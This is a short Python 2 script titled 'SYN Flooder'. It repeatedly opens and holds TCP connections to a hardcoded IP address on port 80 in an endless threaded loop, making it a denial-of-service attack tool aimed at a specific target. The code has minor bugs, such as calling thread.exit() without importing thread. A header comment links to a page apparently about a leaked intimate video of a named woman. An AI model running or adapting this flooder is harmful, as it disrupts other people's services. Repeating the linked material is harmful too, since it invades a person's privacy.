#!/usr/bin/python
# http://www.naoconto.com/2015/04/video-intimo-de-carol-muniz-que-caiu-na-net.html?hc_location=ufi
# SYN Flooder
# Coded By Twi Johnj

import socket
from time import sleep
from thread import start_new_thread
from sys import exit

host = "179.126.40.248"
port = 80

def conn(a):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    sleep(1000)
    s.close()
    thread.exit()


number = 0
while(1):
    try:
        start_new_thread(conn,(None, ))
        sleep(0.01)
        number = number + 1
        print "Attack %s" % str(number)
    except socket.error:
        print ("System Timeout")
        exit(1)
